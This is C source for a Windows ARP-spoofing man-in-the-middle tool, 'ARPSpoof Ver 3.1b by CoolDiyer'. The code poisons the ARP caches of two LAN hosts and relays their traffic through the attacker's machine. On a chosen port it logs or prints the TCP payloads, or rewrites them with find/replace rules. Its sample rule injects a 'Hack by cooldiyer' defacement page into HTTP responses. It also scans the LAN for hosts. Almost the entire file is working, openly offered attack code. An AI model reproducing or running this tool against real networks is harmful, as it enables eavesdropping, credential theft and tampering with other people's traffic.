#include <stdio.h>
#include <pcap.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wpcap.lib")

#include "iphlpapi.h"
#include "protoinfo.h"
#include "spoof.h"
#include "tcp.h"
#include "scan.h"
#include "replace.h"

//
// 存储要替换的字符串的链表结构
//

typedef struct tagSTRLINK
{
	char szOld[256];
	char szNew[256];
	struct tagSTRLINK *next;
}STRLINK, *PSTRLINK;

HANDLE hThread[2]; // 两个发送RARP包的线程
unsigned short g_uPort; // 要监视的端口号
pcap_t *adhandle; // 网卡句柄
HANDLE g_hEvent; // 捕捉 Ctrl+C
int g_uMode; // 欺骗标志 0 表示单向欺骗， 1表示双向欺骗
BOOL bIsReplace = FALSE; // 是否对转发的数据进行替换
BOOL bIsLog = FALSE; // 是否进行数据保存
char szLogfile[MAX_PATH]; // 要保存数据的文件名

// 对应ARPSPOOF结构中的成员
unsigned char ucSelf[6], ucIPA[6], ucIPB[6];
char szIPSelf[16], szIPA[16], szIPB[16], szIPGate[16];

// 初始化链表
PSTRLINK strLink = (PSTRLINK) malloc(sizeof(STRLINK));

char TcpFlag[6]={ 'F','S','R','P','A','U' }; //定义TCP标志位，分析数据包时用

BOOL InitSpoof(char **);
void ResetSpoof();
void Help();

//
// 格式化copy函数，主要是为了替换 '\r', '\n'字符
//

BOOL fstrcpy(char *szSrc, char *szDst)
{
	unsigned int i, j;
	for (i = 0, j=0; i < strlen(szSrc); i++, j++)
	{
		if (szSrc[i] == '\\' && szSrc[i + 1] == 'r') // Replace "\r"
		{
			szDst[j] = '\r';
			i ++;
		}
		else if (szSrc[i] == '\\' && szSrc[i + 1] == 'n') // Replace "\n"
		{
			szDst[j] = '\n';
			i ++;
		}
		else if (szSrc[i] != '\n' && szSrc[i] != '\0')
		{
			szDst[j] = szSrc[i];
		}
		else
		{
			return TRUE;
		}
	}
	szDst[j + 1] = '\0'; // add '\0'
	return TRUE;
}
//
// 把文件中的规则存储到链表中
// 入口参数 szJobfile ==> 规则文件名
// 出口参数 strLink   ==> 指向链表头的指针
//
BOOL ReadJob(char *szJobfile, PSTRLINK strLink)
{
	FILE *fp;
	char szBuff[256], *p = NULL;

	if ((fp = fopen(szJobfile, "rt")) == NULL)
	{
		printf("Job file open error\n");
		return FALSE;
	}

	PSTRLINK pTmp = strLink; // 保存原指针

	while (fgets(szBuff, sizeof(szBuff), fp))
	{
		if (strcmp(szBuff, "----"))
		{
			memset(szBuff, 0, sizeof(szBuff));
			memset(strLink->szOld, 0, sizeof(strLink->szOld));
			fgets(szBuff, sizeof(szBuff), fp);
	
			if (! fstrcpy(szBuff, strLink->szOld))
			{
				printf("[!] job file format error ..\n");
				return FALSE;
			}
			fgets(szBuff, sizeof(szBuff), fp);

			if (strcmp(szBuff, "----"))
			{
				memset(szBuff, 0, sizeof(szBuff));
				memset(strLink->szNew, 0, sizeof(strLink->szNew));
				fgets(szBuff, sizeof(szBuff), fp);
				if (! fstrcpy(szBuff, strLink->szNew))
				{
					printf("[!] job file format error ..\n");
					return FALSE;
				}
			}
			else
			{
				printf("Replace Job file format error, \
					used arpspoof /n release a new job file\n");
				return FALSE;
			}
			strLink->next = (PSTRLINK) malloc(sizeof(STRLINK));
			strLink = strLink->next;
			strLink->next = NULL;
		}
	}
	fclose(fp);
	strLink = pTmp; // 恢复原指针
	return TRUE;
}

//
// 把数据写入文件
// 入口参数: szLogfile ==> 日志文件名 data ==> 指向数据块的空指针 size ==> 数据块大小
// 返回值类型 Boolean
//

BOOL SaveLog(char szLogfile[], const void *data, unsigned int size)
{
	HANDLE hFile;
	DWORD dwBytes;
	hFile = CreateFile(szLogfile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, 
		OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	SetFilePointer(hFile, NULL, NULL, FILE_END);
	WriteFile(hFile, data, size, &dwBytes, NULL);
	CloseHandle(hFile);
	return TRUE;
}

//
// 捕获控制台事件的函数,主要是处理程序中断事务
// 

BOOL CtrlHandler( DWORD fdwCtrlType ) 
{ 
	switch (fdwCtrlType) 
	{ 
	// Handle the CTRL-C signal. 
    case CTRL_C_EVENT: 
    case CTRL_CLOSE_EVENT: 
    case CTRL_BREAK_EVENT:  
    case CTRL_LOGOFF_EVENT: 
    case CTRL_SHUTDOWN_EVENT:
		ResetSpoof(); //  恢复欺骗主机的arp cache
		return TRUE;		
    default: 
		return FALSE;
	}
}

// 
//  为公用变量赋值,初始化参数
//
BOOL InitSpoof(char **argv)
{
	// IPSelf, ucSelf 已经在打开网卡时初始化过了
	memset(ucIPA, 0xff, 6);
	memset(ucIPB, 0xff, 6);
	memset(szIPA, 0 ,16);
	memset(szIPB, 0 ,16);
	
	if (!GetMac((char *) argv[1], ucIPA))
	{
		printf("[!] Error Get Mac Address of %s\n", argv[1]);
		return FALSE;
	}

	if (!GetMac((char *) argv[2], ucIPB))
	{
		printf("[!] Error Get Mac Address of %s\n", argv[2]);
		return FALSE;
	}

	strcpy((char *) szIPA, (char *) argv[1]);
	strcpy((char *) szIPB, (char *) argv[2]);
	StaticARP((unsigned char *) szIPA, ucIPA);
	StaticARP((unsigned char *) szIPB, ucIPB);
	g_uPort = atoi(argv[3]);
	g_uMode = atoi(argv[5]);
	return TRUE;
}

//
// 显示ARP欺骗信息 (调试用)
// 加延迟是为了等待参数传递，因为函数公用一个ARPSPOOF变量
//

void SpoofInfo(PARPSPOOF arpspoof)
{
	/*
	printf("Spoof %s %s MAC %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",
		arpspoof->szTarget, arpspoof->szIP, 
		arpspoof->ucPretendMAC[0], arpspoof->ucPretendMAC[1],
		arpspoof->ucPretendMAC[2], arpspoof->ucPretendMAC[3],
		arpspoof->ucPretendMAC[4], arpspoof->ucPretendMAC[5]
		);
	*/
	Sleep(100);
}

//
// 处理ARP欺骗例程，开始Spoof
//
void ARPSpoof()
{
	PARPSPOOF arpspoof = (PARPSPOOF) malloc(sizeof(ARPSPOOF));
	arpspoof->adhandle = adhandle;
	memcpy(arpspoof->ucSelfMAC, ucSelf, 6);

	// Spoof IP1 -> IP2
	strcpy((char *) arpspoof->szTarget, szIPA);
	memcpy(arpspoof->ucTargetMAC, ucIPA, 6);
	strcpy((char *) arpspoof->szIP, szIPB);
	memcpy(arpspoof->ucIPMAC, ucIPB, 6);
	memcpy(arpspoof->ucPretendMAC, ucSelf, 6);
	hThread[0] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)SpoofThread,
		(LPVOID) arpspoof, NULL, NULL);
	SpoofInfo(arpspoof);

	if (g_uMode == 1) // 如果双向欺骗
	{
		// Spoof IP2 -> IP1
		strcpy((char *) arpspoof->szTarget, szIPB);
		memcpy(arpspoof->ucTargetMAC, ucIPB, 6);
		strcpy((char *) arpspoof->szIP, szIPA);
		memcpy(arpspoof->ucIPMAC, ucIPA, 6);
		memcpy(arpspoof->ucPretendMAC, ucSelf, 6);
		hThread[1] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)SpoofThread,
			(LPVOID) arpspoof, NULL, NULL);
		SpoofInfo(arpspoof);
	}
}

//
// 重置ARP欺骗，恢复受骗主机的ARP cache
//     和ARPSpoof做相反操作
//
void ResetSpoof()
{
	printf("[+] Reseting .....\n");

	TerminateThread(hThread[0], 0);	
	TerminateThread(hThread[1], 0);

	PARPSPOOF arpspoof = (PARPSPOOF) malloc(sizeof(ARPSPOOF));

	arpspoof->adhandle = adhandle;
	strcpy((char *) arpspoof->szTarget, szIPA);
	memcpy(arpspoof->ucTargetMAC, ucIPA, 6);
	strcpy((char *) arpspoof->szIP, szIPB);
	memcpy(arpspoof->ucIPMAC, ucIPB, 6);
	memcpy(arpspoof->ucPretendMAC, ucIPB, 6);
	memcpy(arpspoof->ucSelfMAC, ucSelf, 6);
	hThread[0] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)SpoofThread,
		(LPVOID) arpspoof, NULL, NULL);
	if(g_uMode == 1)
	{
		Sleep(200);
		strcpy((char *) arpspoof->szTarget, szIPB);
		memcpy(arpspoof->ucTargetMAC, ucIPB, 6);
		strcpy((char *) arpspoof->szIP, szIPA);
		memcpy(arpspoof->ucIPMAC, ucIPA, 6);
		memcpy(arpspoof->ucPretendMAC, ucIPA, 6);
		hThread[1] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)SpoofThread,
			(LPVOID) arpspoof, NULL, NULL);
	}

	printf("[-] Sleep 5s ");
	for(int i = 0; i < 12; i++, Sleep(300))
			printf(".");
	printf("\n");
	TerminateThread(hThread[0], 0);	
	TerminateThread(hThread[1], 0);

	// pcap_breakloop后，所有对网卡的操作都会使用程序中止，切记
	pcap_breakloop(adhandle); 
}

//
// 替换数据包中内容, 重新计算校验和
//
void ReplacePacket(const u_char *pkt_data, unsigned int pkt_len)
{
	ETHeader *eh;
    IPHeader *ih;
    TCPHeader *th;
    u_int ip_len;

	eh = (ETHeader *) pkt_data;
	ih = (IPHeader *) (pkt_data + 14);
	ip_len = (ih->iphVerLen & 0xf) * 4;
	th = (TCPHeader *) ((u_char*)ih + ip_len);

	// 得到TCP数据包的指针和长度
	unsigned char *datatcp = (unsigned char *) ih + sizeof(_IPHeader) 
		+ sizeof(struct _TCPHeader);
	int lentcp = ntohs(ih->ipLength) - (sizeof(_IPHeader) + sizeof(_TCPHeader));

	// 开始替换数据内容,重新计算校验和
	PSTRLINK pTmp = strLink;
	int i = 0;
	while (pTmp->next)
	{
		// 开始匹配规则进行替换
		if (Replace(datatcp, lentcp, pTmp->szOld, pTmp->szNew))
		{
			printf("    Applying rul %s ==> %s\n", pTmp->szOld, pTmp->szNew);
			i ++;
		}
		pTmp = pTmp->next;
	}
	if (i >0) // 如果数据包被修改，重新计算校验和
	{
		printf("[*] Done %d replacements, forwarding packet of size %d\n",
			i, pkt_len);
		ih->ipChecksum = 0;
		th->checksum = 0;
		ih->ipChecksum = checksum((USHORT *)ih, sizeof(_IPHeader));
		ComputeTcpPseudoHeaderChecksum(ih, th, (char *)datatcp, lentcp);
	}
	else
		printf("[*] Forwarding untouched packet of size %d\n", pkt_len);

}

//
// 分析显示数据包内容，或者保存至文件
//

void AnalyzePacket(const u_char *pkt_data, unsigned int pkt_len)
{
	ETHeader *eh;
    IPHeader *ih;
    TCPHeader *th;
    u_int ip_len;
	char szSource[16],szDest[16];
    u_short sport, dport;

	eh = (ETHeader *) pkt_data;
	ih = (IPHeader *) (pkt_data + 14);
	ip_len = (ih->iphVerLen & 0xf) * 4;
	th = (TCPHeader *) ((u_char*)ih + ip_len);

	sport = ntohs(th->sourcePort);
	dport = ntohs(th->destinationPort );

	unsigned char *datatcp = (unsigned char *) ih + sizeof(_IPHeader) 
		+ sizeof(struct _TCPHeader);
	int lentcp = ntohs(ih->ipLength) - (sizeof(_IPHeader) + sizeof(_TCPHeader));

	wsprintf(szSource, "%d.%d.%d.%d",
		ih->ipSourceByte.byte1, ih->ipSourceByte.byte2,
		ih->ipSourceByte.byte3, ih->ipSourceByte.byte4);

	wsprintf(szDest, "%d.%d.%d.%d",
		ih->ipDestinationByte.byte1, ih->ipDestinationByte.byte2,
		ih->ipDestinationByte.byte3, ih->ipDestinationByte.byte4);

	// 分析数据包
	char szTmpStr[85], szTmpFlag[7];
	szTmpFlag[6] = '\0';

	unsigned char FlagMask = 1;
	for(int i=0; i<6; i++ )
	{
		if ((th->flags) & FlagMask)
			szTmpFlag[i] = TcpFlag[i]; 
		else
			szTmpFlag[i] = '-';
		FlagMask = FlagMask << 1; 
	}
	wsprintf(szTmpStr,
		"\nTCP %15s->%-15s Bytes=%-4d TTL=%-3d Port:%d->%d %s\n",
		szSource, szDest, lentcp, ih->ipTTL, sport, dport, szTmpFlag);
	printf("%s", szTmpStr);

	if (bIsLog) // 写入文件
	{
		SaveLog(szLogfile, szTmpStr, strlen(szTmpStr));
		SaveLog(szLogfile, datatcp, lentcp);
	}

	//  显示数据包的内容
	for (i = 0; i < lentcp; i++)
	{
		if ((*(datatcp+i) & 0x000000ff) != 0x07)  // 过滤掉可恶的Beep字符
			printf("%c", *(datatcp+i));
	}
}

//
//  处理转发、修改、保存数据包的例程
//  程序的核心部分
//
void ForwardPacket(pcap_t *adhandle, const u_char *pkt_data, unsigned int pkt_len)
{
	ETHeader *eh;
    IPHeader *ih;
    TCPHeader *th;
    u_int ip_len;
	char szSource[16],szDest[16];
    u_short sport, dport;

	eh = (ETHeader *) pkt_data;

	if(eh->type != htons(ETHERTYPE_IP))
		return; // 只转发IP包

	ih = (IPHeader *) (pkt_data + 14); //找到IP头的位置,14为以太头的长度
	ip_len = (ih->iphVerLen & 0xf) * 4; 
	th = (TCPHeader *) ((u_char*)ih + ip_len); // 找到TCP的位置

	// 将端口信息从网络型转变为主机顺序
	sport = ntohs(th->sourcePort);
	dport = ntohs(th->destinationPort );

	// 得到源IP地址，目标IP地址
	wsprintf(szSource, "%d.%d.%d.%d",
		ih->ipSourceByte.byte1, ih->ipSourceByte.byte2,
		ih->ipSourceByte.byte3, ih->ipSourceByte.byte4);
	wsprintf(szDest, "%d.%d.%d.%d",
		ih->ipDestinationByte.byte1, ih->ipDestinationByte.byte2,
		ih->ipDestinationByte.byte3, ih->ipDestinationByte.byte4);

	// 开始过滤要转发的数据包
	if (strcmp(szDest, szIPSelf) != 0 && memcmp(ucSelf, eh->dhost,6) == 0)
	{
		// rebuild IPA -> IPB
		if (memcmp(eh->shost, ucIPA, 6) == 0)
		{
			// 修改以太网头
			memcpy(eh->shost, eh->dhost, 6);
			memcpy(eh->dhost, ucIPB, 6);

			if (ih->ipProtocol == PROTO_TCP && dport == g_uPort)
			{

				if (bIsReplace) // 是否替换
				{
					printf("[+] Caught %15s:%-4d -> %s:%d\n", szSource,	sport, szDest, dport);
					ReplacePacket(pkt_data, pkt_len);
					printf("[*] Forwarding untouched packet of size %d\n", pkt_len);
				}
				else
				{
					AnalyzePacket(pkt_data, pkt_len);
				}
			}
			if (pcap_sendpacket(adhandle, (const unsigned char *) pkt_data, pkt_len) < 0)
			{
				printf("[!] Forward thread send packet error\n");
			}
		}
		// rebuild IPB -> IPA
		else if (memcmp(eh->shost, ucIPB, 6) == 0)
		{
			memcpy(eh->shost, eh->dhost, 6);
			memcpy(eh->dhost, ucIPA, 6);

			if (ih->ipProtocol == PROTO_TCP && sport == g_uPort)
			{
				if (bIsReplace)
				{
					printf("[+] Caught %15s:%-4d -> %s:%d\n", szSource,	sport, szDest, dport);
					ReplacePacket(pkt_data, pkt_len);
					printf("[*] Forwarding untouched packet of size %d\n", pkt_len);
				}
				else
				{
					AnalyzePacket(pkt_data, pkt_len);
				}
			}
			if(pcap_sendpacket(adhandle, (const unsigned char *) pkt_data, pkt_len) < 0)
			{
				printf("[!] Forward thread send packet error\n");
			}
		}
	}
}

//
// pcap_loop的回调函数
// 把接收到的数据传给ForwardPacket函数处理
//
void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)
{
	ForwardPacket(adhandle, pkt_data,header->len);
}

//
// 释放一个实例规则文件
//

int ReleaseJob(const char *szName)
{
	FILE *fp;
	if ((fp = fopen("job.txt","w")) == NULL)
		return 0;
	fputs("----\nHTTP/1.\n----\nHTTP/1.1 200 OK\\r\\n" \
		"Server: CoolDiyer's Hack IIS\\r\\nContent-Length: 27\\r\\n" \
		"Connection: close\\r\\nContent-Type: text/html\\r\\n\\r\\n" \
		"Hack by cooldiyer<noframes>\n----", fp);
	fclose(fp);
	return 1;
}

//
// 主函数，主要处理参数的初始化
//
int main(int argc, char *argv[])
{
	printf("ARPSpoof Ver 3.1b by CoolDiyer\n");

	if (argc >1)
	{
		if (argv[1][1] == 'l') // 列出可用的网卡
		{
			ListAdapters();
			return 0;
		}

		if (argv[1][1] == 'n') // 释放一个示例规则文件 job.txt
		{
			if (ReleaseJob("job.txt"))
			{
				printf("[+] Replace Job file job.txt release success...\n");
				return 0;		
			}
			else
			{
				printf("[!] Release job file error\n");
				return -1;
			}
		}

		if (argc == 4 && argv[1][1] == 's')
		{
			EnumLanHost(argv[2], argv[3]);
			return 0;
		}
	}

	if (argc < 6) // 参数不正确，显示使用帮助
	{
		Help();
		return 0;
	}

	// 打开网卡，初始化szIPSelf, ucSelf, szIPGate变量
	if ((adhandle = OpenAdapter(atoi(argv[4]), szIPSelf, ucSelf, szIPGate)) == NULL)
	{
		printf("[!] Open adatper error!\n");
		return FALSE;
	}

	// 初始化其它变量，转入核心例程
	if (InitSpoof(argv))
	{
		if (argc == 7 && strcmpi(argv[6], "/reset") == 0) // 启用恢复线程，5秒后退出程序
		{
			if (g_uMode == 1)
				printf("[*] Reset  %s <-> %s\n", szIPA ,szIPB);
			else
				printf("[*] Reset  %s --> %s\n", szIPA ,szIPB);
			ResetSpoof();
		}
		else if (argc >5 )
		{
			SetConsoleCtrlHandler((PHANDLER_ROUTINE) CtrlHandler, TRUE);
			if (argc == 8 && argv[6][1] == 'r') // 如果是要替换转发内容
			{
				if (ReadJob(argv[7], strLink)) // 加载规则文件,并显示替换规则
				{
					PSTRLINK pTmp = strLink;
					int i=0;
					while (pTmp->next)
					{
						i++;
						printf("[*] Parsing rul %s ==> %s\n", pTmp->szOld, pTmp->szNew);
						pTmp = pTmp->next;
					}
					bIsReplace = TRUE;
					printf("[+] Loaded %d rules...\n", i);
				}
				else
					return -1;

			}
			if (argc == 8 && argv[6][1] == 's') //  是否保存数据到文件
			{
				strcpy(szLogfile, argv[7]);
				bIsLog = TRUE;
				printf("[+] Save log to %s\n", szLogfile);
			}

			if (g_uMode == 1) //  双向欺骗
				printf("[*] Spoofing  %s <-> %s\n", szIPA ,szIPB);
			else // 单向欺骗
				printf("[*] Spoofing  %s --> %s\n", szIPA ,szIPB);

			if (!bIsReplace) // 只转发，不替换
				printf("[+] Using fixed forwarding thread.\n");

			// 开始主要例程，欺骗并转发处理数据包
			ARPSpoof();
			pcap_loop(adhandle, 0, packet_handler, NULL);
		}
	}

	pcap_close(adhandle);
	return 0;
}

//
// 帮助函数，对一些参数的说明和程序的使用
//
void Help()
{
	printf("Usage:\n");
	printf("  ArpSpoof <IP1> <IP2> <PORT> <AdpNum> <Mode> /[r|s] <File>\n");
	printf("  ArpSpoof /s <IP> <Mask>\n");
	printf("  ArpSpoof /l\n");
	printf("\tMode Options:\n\t\t0\tIP1 --> IP2\n");
	printf("\t\t1\tIP1 <-> IP2\n");
	printf("Examples:\n");
	printf("\t> ArpSpoof 192.168.0.1 192.168.0.8 80 2 1 /r job.txt\n");
	printf("\t  # Spoof 192.168.0.1 <-> 192.168.0.8:80 with rule\n\n");
	printf("\t> ArpSpoof 192.168.0.1 192.168.0.8 21 2 1 /s sniff.log\n");
	printf("\t  # Spoof 192.168.0.1 <-> 192.168.0.8:80 save to log\n\n");
	printf("\t> ArpSpoof 192.168.0.1 192.168.0.8 80 2 0 /RESET\n");
	printf("\t  # Reset 192.168.0.1 --> 192.168.0.8:80\n\n");
	printf("\t> ArpSpoof /s 192.168.0.1 255.255.255.0\n");
	printf("\t  # Scan lan host\n\n");
	printf("\t> ArpSpoof /l\n");
	printf("\t  # Lists adapters\n\n");
	printf("\t> ArpSpoof /n\n");
	printf("\t  # Release a new replace rule file\n");
}
